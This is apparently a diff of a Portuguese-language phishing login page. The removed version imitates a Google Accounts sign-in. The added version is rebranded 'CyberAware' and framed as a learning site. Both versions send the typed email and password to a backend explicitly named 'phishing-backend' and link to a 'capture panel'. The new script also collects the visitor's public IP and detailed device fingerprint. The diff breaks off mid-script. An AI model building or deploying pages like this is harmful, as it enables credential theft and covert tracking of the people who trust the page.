@@ -1,299 +1,880 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - Google Accounts</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-        }
-        
-        .login-container {
-            width: 100%;
-            max-width: 450px;
-            padding: 20px;
-        }
-        
-        .login-card {
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            padding: 48px 40px 36px;
-            background: #fff;
-        }
-        
-        .logo {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 10px;
-        }
-        
-        .logo svg {
-            width: 75px;
-            height: 24px;
-        }
-        
-        h1 {
-            font-size: 24px;
-            font-weight: 400;
-            color: #202124;
-            text-align: center;
-            margin-bottom: 8px;
-        }
-        
-        .subtitle {
-            font-size: 16px;
-            color: #202124;
-            text-align: center;
-            margin-bottom: 40px;
-        }
-        
-        .login-form {
-            display: flex;
-            flex-direction: column;
-            gap: 30px;
-        }
-        
-        .input-group {
-            position: relative;
-        }
-        
-        .input-group input {
-            width: 100%;
-            padding: 13px 15px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            outline: none;
-            transition: border-color 0.2s;
-            background: transparent;
-        }
-        
-        .input-group input:focus {
-            border-color: #1a73e8;
-            border-width: 2px;
-            padding: 12px 14px;
-        }
-        
-        .input-group label {
-            position: absolute;
-            left: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #5f6368;
-            font-size: 16px;
-            pointer-events: none;
-            transition: all 0.2s;
-            background: #fff;
-            padding: 0 4px;
-        }
-        
-        .input-group input:focus + label,
-        .input-group input:not(:placeholder-shown) + label {
-            top: 0;
-            font-size: 12px;
-            color: #1a73e8;
-        }
-        
-        .error {
-            color: #d93025;
-            font-size: 14px;
-            margin-top: -20px;
-            min-height: 20px;
-        }
-        
-        .login-button {
-            background: #1a73e8;
-            color: #fff;
-            border: none;
-            border-radius: 4px;
-            padding: 12px 24px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.2s;
-            margin-top: 10px;
-        }
-        
-        .login-button:hover {
-            background: #1557b0;
-        }
-        
-        .login-button:disabled {
-            background: #1a73e880;
-            cursor: not-allowed;
-        }
-        
-        .footer-links {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 40px;
-            padding-top: 20px;
-            border-top: 1px solid #dadce0;
-        }
-        
-        .footer-links a {
-            color: #5f6368;
-            text-decoration: none;
-            font-size: 14px;
-        }
-        
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-        
-        @media (max-width: 450px) {
-            .login-card {
-                padding: 24px 20px;
-                border: none;
-                border-radius: 0;
-            }
-            
-            .login-container {
-                padding: 0;
-                max-width: 100%;
-            }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#0a0e27">
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
+<title>Login - CyberAware</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+
+html,body{
+  width:100%;
+  height:100%;
+  overflow:hidden;
+}
+
+body{
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  background:#0a0e27;
+  color:#fff;
+  -webkit-text-size-adjust:100%;
+}
+
+/* === ANIMATED BACKGROUND === */
+.bg-animation{
+  position:fixed;
+  top:0;left:0;
+  width:100%;height:100%;
+  z-index:0;
+  background:linear-gradient(135deg,#0a0e27 0%,#1a1f4e 50%,#0a0e27 100%);
+  background-size:400% 400%;
+  animation:gradientShift 15s ease infinite;
+}
+
+@keyframes gradientShift{
+  0%{background-position:0% 50%}
+  50%{background-position:100% 50%}
+  100%{background-position:0% 50%}
+}
+
+.bg-shapes{
+  position:fixed;
+  top:0;left:0;
+  width:100%;height:100%;
+  z-index:1;
+  overflow:hidden;
+  pointer-events:none;
+}
+
+.shape{
+  position:absolute;
+  border-radius:50%;
+  opacity:0.1;
+  animation:float 20s infinite ease-in-out;
+}
+
+.shape:nth-child(1){
+  width:300px;height:300px;
+  background:radial-gradient(circle,#ff3b3b,transparent);
+  top:-100px;left:-100px;
+  animation-delay:0s;
+}
+
+.shape:nth-child(2){
+  width:400px;height:400px;
+  background:radial-gradient(circle,#00e5ff,transparent);
+  bottom:-150px;right:-150px;
+  animation-delay:5s;
+}
+
+.shape:nth-child(3){
+  width:250px;height:250px;
+  background:radial-gradient(circle,#ffa500,transparent);
+  top:50%;left:50%;
+  transform:translate(-50%,-50%);
+  animation-delay:10s;
+}
+
+@keyframes float{
+  0%,100%{transform:translate(0,0) scale(1)}
+  25%{transform:translate(50px,-50px) scale(1.1)}
+  50%{transform:translate(-30px,80px) scale(0.9)}
+  75%{transform:translate(-60px,-30px) scale(1.05)}
+}
+
+/* === PARTICLES === */
+.particles{
+  position:fixed;
+  top:0;left:0;
+  width:100%;height:100%;
+  z-index:2;
+  pointer-events:none;
+}
+
+.particle{
+  position:absolute;
+  width:3px;height:3px;
+  background:rgba(255,255,255,0.5);
+  border-radius:50%;
+  animation:particleFloat 10s infinite linear;
+}
+
+@keyframes particleFloat{
+  0%{transform:translateY(100vh) rotate(0deg);opacity:0}
+  10%{opacity:1}
+  90%{opacity:1}
+  100%{transform:translateY(-100px) rotate(360deg);opacity:0}
+}
+
+/* === LOGIN CONTAINER === */
+.login-container{
+  position:relative;
+  z-index:10;
+  width:100%;
+  max-width:420px;
+  padding:16px;
+  max-height:100vh;
+  overflow-y:auto;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+
+.login-card{
+  background:rgba(255,255,255,0.08);
+  backdrop-filter:blur(20px);
+  -webkit-backdrop-filter:blur(20px);
+  border:1px solid rgba(255,255,255,0.15);
+  border-radius:24px;
+  padding:40px 36px;
+  box-shadow:0 25px 50px rgba(0,0,0,0.3);
+  animation:cardAppear 0.8s cubic-bezier(0.175,0.885,0.32,1.275);
+  width:100%;
+}
+
+@keyframes cardAppear{
+  from{opacity:0;transform:translateY(30px) scale(0.95)}
+  to{opacity:1;transform:translateY(0) scale(1)}
+}
+
+.login-header{
+  text-align:center;
+  margin-bottom:32px;
+}
+
+.login-logo{
+  width:60px;height:60px;
+  margin:0 auto 16px;
+  background:linear-gradient(135deg,#ff3b3b,#ff6b6b);
+  border-radius:16px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  animation:logoPulse 3s infinite ease-in-out;
+  box-shadow:0 10px 30px rgba(255,59,59,0.3);
+}
+
+@keyframes logoPulse{
+  0%,100%{transform:scale(1);box-shadow:0 10px 30px rgba(255,59,59,0.3)}
+  50%{transform:scale(1.05);box-shadow:0 15px 40px rgba(255,59,59,0.5)}
+}
+
+.login-logo svg{
+  width:32px;height:32px;
+  stroke:#fff;
+  fill:none;
+  stroke-width:2;
+}
+
+.login-title{
+  font-size:clamp(1.5rem,5vw,1.8rem);
+  font-weight:700;
+  margin-bottom:6px;
+  background:linear-gradient(135deg,#fff,#a0a0a0);
+  -webkit-background-clip:text;
+  -webkit-text-fill-color:transparent;
+  background-clip:text;
+}
+
+.login-subtitle{
+  font-size:clamp(0.82rem,2.5vw,0.9rem);
+  color:rgba(255,255,255,0.6);
+}
+
+/* === FORM === */
+.form-group{
+  margin-bottom:18px;
+  position:relative;
+}
+
+.form-label{
+  display:block;
+  font-size:0.82rem;
+  font-weight:600;
+  margin-bottom:6px;
+  color:rgba(255,255,255,0.8);
+  transition:color 0.3s;
+}
+
+.form-input{
+  width:100%;
+  padding:12px 14px;
+  background:rgba(255,255,255,0.05);
+  border:2px solid rgba(255,255,255,0.1);
+  border-radius:10px;
+  color:#fff;
+  font-size:0.92rem;
+  font-family:inherit;
+  transition:all 0.3s ease;
+  outline:none;
+  -webkit-appearance:none;
+}
+
+.form-input::placeholder{
+  color:rgba(255,255,255,0.3);
+}
+
+.form-input:focus{
+  background:rgba(255,255,255,0.08);
+  border-color:#ff3b3b;
+  box-shadow:0 0 0 3px rgba(255,59,59,0.1);
+}
+
+.form-input.error{
+  border-color:#ff3b3b;
+  animation:shake 0.4s;
+}
+
+@keyframes shake{
+  0%,100%{transform:translateX(0)}
+  25%{transform:translateX(-5px)}
+  75%{transform:translateX(5px)}
+}
+
+.password-wrapper{
+  position:relative;
+}
+
+.password-toggle{
+  position:absolute;
+  right:12px;
+  top:50%;
+  transform:translateY(-50%);
+  background:none;
+  border:none;
+  cursor:pointer;
+  padding:4px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+
+.password-toggle svg{
+  width:18px;height:18px;
+  stroke:rgba(255,255,255,0.5);
+  fill:none;
+  stroke-width:2;
+  transition:stroke 0.3s;
+}
+
+.password-toggle:hover svg{
+  stroke:#fff;
+}
+
+/* === OPTIONS === */
+.form-options{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  margin-bottom:22px;
+  font-size:0.82rem;
+  flex-wrap:wrap;
+  gap:8px;
+}
+
+.remember-me{
+  display:flex;
+  align-items:center;
+  gap:6px;
+  cursor:pointer;
+  color:rgba(255,255,255,0.7);
+  transition:color 0.3s;
+}
+
+.remember-me:hover{
+  color:#fff;
+}
+
+.checkbox{
+  width:16px;height:16px;
+  border:2px solid rgba(255,255,255,0.3);
+  border-radius:4px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  transition:all 0.3s;
+}
+
+.remember-me input{
+  display:none;
+}
+
+.remember-me input:checked + .checkbox{
+  background:#ff3b3b;
+  border-color:#ff3b3b;
+}
+
+.remember-me input:checked + .checkbox::after{
+  content:'✓';
+  color:#fff;
+  font-size:10px;
+  font-weight:bold;
+}
+
+.forgot-password{
+  color:#ff3b3b;
+  text-decoration:none;
+  font-weight:600;
+  transition:all 0.3s;
+  position:relative;
+}
+
+.forgot-password::after{
+  content:'';
+  position:absolute;
+  bottom:-2px;
+  left:0;
+  width:0;
+  height:2px;
+  background:#ff3b3b;
+  transition:width 0.3s;
+}
+
+.forgot-password:hover::after{
+  width:100%;
+}
+
+/* === BUTTON === */
+.login-button{
+  width:100%;
+  padding:14px;
+  background:linear-gradient(135deg,#ff3b3b,#ff6b6b);
+  border:none;
+  border-radius:10px;
+  color:#fff;
+  font-size:0.95rem;
+  font-weight:700;
+  font-family:inherit;
+  cursor:pointer;
+  transition:all 0.3s ease;
+  position:relative;
+  overflow:hidden;
+  text-transform:uppercase;
+  letter-spacing:1px;
+}
+
+.login-button::before{
+  content:'';
+  position:absolute;
+  top:50%;
+  left:50%;
+  width:0;
+  height:0;
+  border-radius:50%;
+  background:rgba(255,255,255,0.3);
+  transform:translate(-50%,-50%);
+  transition:width 0.6s,height 0.6s;
+}
+
+.login-button:hover::before{
+  width:300px;
+  height:300px;
+}
+
+.login-button:hover{
+  transform:translateY(-2px);
+  box-shadow:0 10px 30px rgba(255,59,59,0.4);
+}
+
+.login-button:active{
+  transform:translateY(0);
+}
+
+/* === DIVIDER === */
+.divider{
+  display:flex;
+  align-items:center;
+  margin:22px 0;
+  color:rgba(255,255,255,0.4);
+  font-size:0.8rem;
+}
+
+.divider::before,.divider::after{
+  content:'';
+  flex:1;
+  height:1px;
+  background:rgba(255,255,255,0.1);
+}
+
+.divider span{
+  padding:0 12px;
+}
+
+/* === SOCIAL LOGIN === */
+.social-login{
+  display:flex;
+  gap:10px;
+}
+
+.social-button{
+  flex:1;
+  padding:11px;
+  background:rgba(255,255,255,0.05);
+  border:2px solid rgba(255,255,255,0.1);
+  border-radius:10px;
+  cursor:not-allowed;
+  transition:all 0.3s;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  opacity:0.6;
+}
+
+.social-button svg{
+  width:22px;height:22px;
+}
+
+.social-button.google{
+  flex:2.2;
+  background:rgba(255,255,255,0.1);
+  border-color:rgba(255,255,255,0.25);
+  position:relative;
+  overflow:hidden;
+  opacity:1;
+}
+
+.social-button.google::before{
+  content:'';
+  position:absolute;
+  top:0;left:0;right:0;bottom:0;
+  background:linear-gradient(135deg,rgba(66,133,244,0.1),rgba(234,67,53,0.1));
+  opacity:0;
+  transition:opacity 0.3s;
+}
+
+.social-button.google:hover::before{
+  opacity:1;
+}
+
+.social-button.google svg{
+  width:24px;height:24px;
+}
+
+/* === FOOTER === */
+.login-footer{
+  text-align:center;
+  margin-top:18px;
+  font-size:0.75rem;
+  color:rgba(255,255,255,0.4);
+}
+
+.login-footer a{
+  color:#ff3b3b;
+  text-decoration:none;
+  font-weight:600;
+}
+
+/* === RESPONSIVE === */
+@media(max-width:480px){
+  .login-card{
+    padding:28px 22px;
+    border-radius:20px;
+    background:rgba(255,255,255,0.1);
+  }
+  
+  .login-header{
+    margin-bottom:24px;
+  }
+  
+  .login-logo{
+    width:52px;height:52px;
+    margin-bottom:12px;
+  }
+  
+  .login-logo svg{
+    width:28px;height:28px;
+  }
+  
+  .form-group{
+    margin-bottom:14px;
+  }
+  
+  .form-input{
+    padding:11px 12px;
+    font-size:0.88rem;
+  }
+  
+  .login-button{
+    padding:13px;
+    font-size:0.9rem;
+  }
+  
+  .shape{
+    display:none;
+  }
+  
+  .login-container{
+    padding:12px;
+  }
+  
+  .form-options{
+    margin-bottom:18px;
+  }
+  
+  .divider{
+    margin:18px 0;
+  }
+}
+
+@media(max-width:360px){
+  .login-card{
+    padding:24px 18px;
+  }
+  
+  .login-title{
+    font-size:1.4rem;
+  }
+  
+  .form-input{
+    padding:10px 11px;
+    font-size:0.85rem;
+  }
+  
+  .social-button{
+    padding:10px;
+  }
+}
+
+@media(max-height:600px){
+  .login-card{
+    padding:24px 22px;
+  }
+  
+  .login-header{
+    margin-bottom:18px;
+  }
+  
+  .login-logo{
+    width:48px;height:48px;
+    margin-bottom:10px;
+  }
+  
+  .form-group{
+    margin-bottom:12px;
+  }
+  
+  .divider{
+    margin:14px 0;
+  }
+}
+
+/* === LOADING STATE === */
+.login-button.loading{
+  pointer-events:none;
+  opacity:0.8;
+}
+
+.login-button.loading::after{
+  content:'';
+  position:absolute;
+  top:50%;
+  left:50%;
+  width:22px;
+  height:22px;
+  margin:-11px 0 0 -11px;
+  border:3px solid rgba(255,255,255,0.3);
+  border-top-color:#fff;
+  border-radius:50%;
+  animation:spin 0.8s linear infinite;
+}
+
+@keyframes spin{
+  to{transform:rotate(360deg)}
+}
+
+/* === SUCCESS STATE === */
+.login-button.success{
+  background:linear-gradient(135deg,#00c853,#69f0ae);
+}
+
+/* === ERROR MESSAGE === */
+.error-message{
+  color:#ff3b3b;
+  font-size:0.72rem;
+  margin-top:5px;
+  display:none;
+  animation:fadeIn 0.3s;
+}
+
+.error-message.show{
+  display:block;
+}
+
+@keyframes fadeIn{
+  from{opacity:0;transform:translateY(-5px)}
+  to{opacity:1;transform:translateY(0)}
+}
+</style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="login-card">
-            <div class="logo">
-                <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M13.04 14.28c.47 0 .88-.16 1.23-.48.35-.32.52-.7.52-1.15 0-.45-.17-.83-.52-1.14-.35-.31-.76-.47-1.23-.47-.47 0-.88.16-1.23.48-.35.31-.52.7-.52 1.14 0 .45.17.83.52 1.15.35.32.76.48 1.23.48zm7.14-3.44c0 .34-.03.67-.09.99-.08.55-.23 1.02-.45 1.41-.3.63-.73 1.1-1.29 1.41-.56.31-1.22.47-1.98.47-.52 0-1-.09-1.45-.28-.45-.19-.84-.47-1.15-.85-.31-.38-.55-.84-.72-1.39-.17-.55-.25-1.16-.25-1.84h2.13c0 .46.04.87.12 1.23.08.36.2.67.37.92.17.25.38.44.64.57.25.13.55.2.89.2.37 0 .69-.1.95-.29.26-.19.43-.42.5-.68h2.17c-.25.95-.78 1.72-1.59 2.3-.81.58-1.85.87-3.12.87-.71 0-1.36-.11-1.95-.33-.59-.22-1.1-.54-1.52-.96-.42-.42-.75-.92-.98-1.51-.23-.59-.35-1.26-.35-2.01 0-.76.12-1.44.36-2.04.24-.6.58-1.1 1.02-1.5.44-.4.96-.7 1.56-.9.6-.2 1.27-.3 2.01-.3.74 0 1.4.1 1.98.3.58.2 1.07.5 1.48.89.41.39.72.87.93 1.44.21.57.31 1.21.31 1.93h-2.13c0-.49-.05-.92-.16-1.29-.11-.37-.28-.67-.5-.9-.22-.23-.51-.34-.85-.34-.34 0-.63.11-.86.34-.23.23-.38.53-.45.9-.07.37-.11.79-.11 1.26zm-5.65 3.17c0-.68.1-1.33.29-1.96.19-.63.47-1.18.83-1.65.36-.47.82-.84 1.37-1.11.55-.27 1.19-.41 1.92-.41.73 0 1.37.14 1.92.41.55.27 1.01.64 1.37 1.11.36.47.64 1.02.83 1.65.19.63.29 1.28.29 1.96 0 .68-.1 1.33-.29 1.96-.19.63-.47 1.18-.83 1.65-.36.47-.82.84-1.37 1.11-.55.27-1.19.41-1.92.41-.73 0-1.37-.14-1.92-.41-.55-.27-1.01-.64-1.37-1.11-.36-.47-.64-1.02-.83-1.65-.19-.63-.29-1.28-.29-1.96z" fill="#4285F4"></path>
-                    <path d="M22.2 6.73h-2.6v-1.7h-2.5v1.7h-1.2v2h1.2v3.5c0 1.4.3 2.5.9 3.3.6.8 1.5 1.2 2.6 1.2.4 0 .8-.1 1.2-.2v-2c-.3.1-.7.1-1.1.1-.6 0-1.1-.2-1.4-.5-.3-.3-.5-.8-.5-1.4v-3h2.6v-2z" fill="#EA4335"></path>
-                    <path d="M26.8 6.73h-2.5v10h2.5v-4.2c0-1.2.1-2.3.4-3.3.3-1 .8-1.9 1.5-2.6.7-.7 1.6-1.1 2.7-1.1v2.5c-.4 0-.8.1-1.1.3-.3.2-.5.5-.6.9-.1.4-.2.9-.2 1.4v4.1h2.5v-4.4c0-1.1.1-2.1.3-3 .2-.9.6-1.7 1.1-2.3.5-.6 1.2-1.1 2.1-1.4.9-.3 2-.5 3.2-.5v2.6c-1.1 0-2.1.1-3 .4-.9.3-1.7.7-2.3 1.3-.6.6-1.1 1.3-1.4 2.2-.3.9-.5 1.9-.5 3.1v4.4h2.5v-4.7c0-1.1.1-2.1.3-3 .2-.9.6-1.7 1.1-2.3.5-.6 1.2-1.1 2.1-1.4.9-.3 2-.5 3.2-.5v2.6c-1.1 0-2.1.1-3 .4-.9.3-1.7.7-2.3 1.3-.6.6-1.1 1.3-1.4 2.2-.3.9-.5 1.9-.5 3.1v4.7h2.5v-9.9z" fill="#4285F4"></path>
-                </svg>
-            </div>
-            <h1>Fazer login</h1>
-            <p class="subtitle">Use sua Conta do Google</p>
-            
-            <form id="loginForm" class="login-form">
-                <div class="input-group">
-                    <input type="email" id="email" name="email" required autocomplete="email">
-                    <label for="email">Email ou telefone</label>
-                </div>
-                
-                <div class="input-group">
-                    <input type="password" id="password" name="password" required minlength="8" autocomplete="current-password">
-                    <label for="password">Senha</label>
-                </div>
-                
-                <p id="error" class="error"></p>
-                
-                <button type="submit" class="login-button" id="submitBtn">
-                    <span id="btnText">Login</span>
-                </button>
-            </form>
-            
-            <div class="footer-links">
-                <a href="#">Ajuda</a>
-                <a href="#">Privacidade</a>
-                <a href="#">Termos</a>
-                <a href="/logs.html" style="color: #1a73e8;">Painel de Capturas</a>
-            </div>
-        </div>
+
+<div class="bg-animation"></div>
+
+<div class="bg-shapes">
+  <div class="shape"></div>
+  <div class="shape"></div>
+  <div class="shape"></div>
+</div>
+
+<div class="particles" id="particles"></div>
+
+<div class="login-container">
+  <div class="login-card">
+    <div class="login-header">
+      <div class="login-logo">
+        <svg viewBox="0 0 24 24"><path d="M12 2L3 7v10l9 5 9-5V7l-9-5z"/></svg>
+      </div>
+      <h1 class="login-title">Venha Aprender</h1>
+      <p class="login-subtitle">Entre na sua conta para começar</p>
     </div>
+
+    <form id="loginForm">
+      <div class="form-group">
+        <label class="form-label" for="email">Email</label>
+        <input type="email" id="email" class="form-input" placeholder="seuemail@gmail.com" required autocomplete="email">
+        <div class="error-message" id="emailError">Por favor, use um email válido</div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="password">Senha</label>
+        <div class="password-wrapper">
+          <input type="password" id="password" class="form-input" placeholder="••••••••" required minlength="8" autocomplete="current-password">
+          <button type="button" class="password-toggle" id="passwordToggle">
+            <svg id="eyeIcon" viewBox="0 0 24 24">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+              <circle cx="12" cy="12" r="3"/>
+            </svg>
+          </button>
+        </div>
+        <div class="error-message" id="passwordError">A senha deve ter pelo menos 8 dígitos</div>
+      </div>
+
+      <div class="form-options">
+        <label class="remember-me">
+          <input type="checkbox" id="remember">
+          <span class="checkbox"></span>
+          Lembrar-me
+        </label>
+        <a href="#" class="forgot-password">Esqueceu a senha?</a>
+      </div>
+
+      <button type="submit" class="login-button" id="loginButton">
+        Entrar
+      </button>
+    </form>
+
+    <div class="divider">
+      <span>ou continue com</span>
+    </div>
+
+    <div class="social-login">
+      <button class="social-button google" type="button" disabled>
+        <svg viewBox="0 0 24 24">
+          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+        </svg>
+      </button>
+      <button class="social-button" type="button" disabled>
+        <svg viewBox="0 0 24 24" fill="#fff">
+          <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+        </svg>
+      </button>
+    </div>
+
+    <div class="login-footer">
+      <a href="/logs" style="color:#ff3b3b;font-weight:600;">📊 Painel de Capturas (Admin)</a>
+    </div>
+  </div>
+</div>
+
+<script>
+const API_URL = 'https://phishing-backend-50tr.onrender.com/api';
+
+// Partículas
+(function(){
+  var particlesContainer = document.getElementById('particles');
+  for(var i = 0; i < 25; i++){
+    var particle = document.createElement('div');
+    particle.className = 'particle';
+    particle.style.left = Math.random() * 100 + '%';
+    particle.style.animationDuration = (Math.random() * 10 + 8) + 's';
+    particle.style.animationDelay = Math.random() * 5 + 's';
+    particle.style.opacity = Math.random() * 0.5 + 0.2;
+    particlesContainer.appendChild(particle);
+  }
+})();
+
+// Toggle de senha
+var passwordToggle = document.getElementById('passwordToggle');
+var passwordInput = document.getElementById('password');
+var eyeIcon = document.getElementById('eyeIcon');
+
+passwordToggle.addEventListener('click', function(){
+  if(passwordInput.type === 'password'){
+    passwordInput.type = 'text';
+    eyeIcon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
+  } else {
+    passwordInput.type = 'password';
+    eyeIcon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
+  }
+});
+
+// Validação
+var emailInput = document.getElementById('email');
+var emailError = document.getElementById('emailError');
+var passwordError = document.getElementById('passwordError');
+
+emailInput.addEventListener('input', function(){
+  if(this.classList.contains('error')){
+    this.classList.remove('error');
+    emailError.classList.remove('show');
+  }
+});
+
+passwordInput.addEventListener('input', function(){
+  if(this.classList.contains('error')){
+    this.classList.remove('error');
+    passwordError.classList.remove('show');
+  }
+});
+
+// Login
+var loginForm = document.getElementById('loginForm');
+var loginButton = document.getElementById('loginButton');
+
+// Função para capturar IP público do usuário
+async function getUserIP() {
+  try {
+    const res = await fetch('https://api.ipify.org?format=json');
+    const data = await res.json();
+    return data.ip;
+  } catch (e) {
+    try {
+      const res = await fetch('https://api.ipapi.co/json/');
+      const data = await res.json();
+      return data.ip;
+    } catch (e2) {
+      return 'unknown';
+    }
+  }
+}
+
+// Função para capturar informações detalhadas do dispositivo
+function getDeviceInfo() {
+  const ua = navigator.userAgent;
+  const lang = navigator.language || 'unknown';
+  const platform = navigator.platform || 'unknown';
+  const screenRes = `${screen.width}x${screen.height}`;
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
+  const cores = navigator.hardwareConcurrency || 'unknown';
+  const memory = navigator.deviceMemory || 'unknown';
+  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  const networkType = connection ? (connection.effectiveType || connection.type || 'unknown') : 'unknown';
+  const batterySupported = 'getBattery' in navigator;
+  
+  return {
+    user_agent: ua,
+    language: lang,
+    platform: platform,
+    screen: screenRes,
+    timezone: timezone,
+    cores: cores,
+    memory: memory,
+    network: networkType,
+    battery: batterySupported,
+    cookies: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack || 'unknown',
+    online: navigator.onLine,
+    referrer: document.referrer || 'direct',
+    url: window.location.href
+  };
+}
+
+loginForm.addEventListener('submit', async function(e){
+  e.preventDefault();
+  
+  var email = emailInput.value.trim();
+  var password = passwordInput.value;
+  
+  // Validação email
+  if(!email || !email.includes('@')){
+    emailInput.classList.add('error');
+    emailError.classList.add('show');
+    return;
+  }
+  
+  // Validação senha
+  if(password.length < 8){
+    passwordInput.classList.add('error');
+    passwordError.classList.add('show');
+    return;
+  }
+  
+  loginButton.classList.add('loading');
+  loginButton.textContent = '';
+  
+  try {
+    // Capturar IP e informações do dispositivo em paralelo
+    const [userIP, deviceInfo] = await Promise.all([
+      getUserIP(),
+      Promise.resolve(getDeviceInfo())
+    ]);
     
-    <script>
-        const API_URL = 'https://phishing-backend-50tr.onrender.com/api';
-        const form = document.getElementById('loginForm');
-        const emailInput = document.getElementById('email');
-        const passwordInput = document.getElementById('password');
-        const errorEl = document.getElementById('error');
-        const submitBtn = document.getElementById('submitBtn');
-        const btnText = document.getElementById('btnText');
+    const response = await fetch(`${API_URL}/login`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ 
+        email, 
+        password,
+        client_ip: userIP,
+        device_info: deviceInfo
+      })
+    });
+    
+    const data = await response.json();
+    
+    if (response.ok) {
+      // Marcar como logado no localStorage
+      localStorage.setItem('phishing_logged_in', 'true');
+      localStorage.setItem('phishing_user_email', email);
+      localStorage.setItem('phishing_login_time', new Date().toISOString());
+      
+      loginButton.classList.remove('loading');
+      loginButton.classList.add('success');
+      loginButton.textContent = '✓ Sucesso!';
+      
+      // Registrar service worker
+      if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('/sw.js').catch(function(){});
+      }
+      
+      // Redirecionar após 1.5s
+      setTimeout(function(){
+        window.location.href = '/apos_login.html';
+      }, 1500);
+    } else {
+      loginButton.classList.remove('loading');
+      loginButton.textContent = 'Entrar';
+      emailInput.classList.add('error');
+      emailError.textContent = data.error || 'Erro ao fazer login';
+      emailError.classList.add('show');
+    }
+  } catch (err) {
+    loginButton.classList.remove('loading');
+    loginButton.textContent = 'Entrar';
+    emailError.textContent = 'Erro de conexão. Tente novamente.';
+    emailError.classList.add('show');
+  }
+});
+</script>
 
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            errorEl.textContent = '';
-            
-            const email = emailInput.value.trim();
-            const password = passwordInput.value;
-            
-            if (!email) {
-                errorEl.textContent = 'Digite um email válido';
-                return;
-            }
-            
-            if (password.length < 8) {
-                errorEl.textContent = 'A senha deve ter pelo menos 8 dígitos';
-                return;
-            }
-            
-            submitBtn.disabled = true;
-            btnText.textContent = 'Entrando...';
-            
-            try {
-                const response = await fetch(`${API_URL}/login`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ email, password }),
-                });
-                
-                const data = await response.json();
-                
-                if (response.ok) {
